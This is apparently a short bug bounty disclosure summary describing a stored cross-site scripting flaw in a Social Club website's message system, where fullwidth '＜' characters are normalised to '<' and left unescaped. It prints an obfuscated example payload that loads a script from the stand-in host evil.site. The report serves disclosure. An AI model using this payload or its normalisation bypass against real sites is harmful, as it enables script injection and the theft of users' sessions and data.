Summary:
In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website. By taking advantage of the fact that '＜' characters are normalized to '<', as well as discovering improper escaping of the aforementioned '<' character, the researcher was able to craft a payload to perform XSS attacks. 

An example payload:

=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
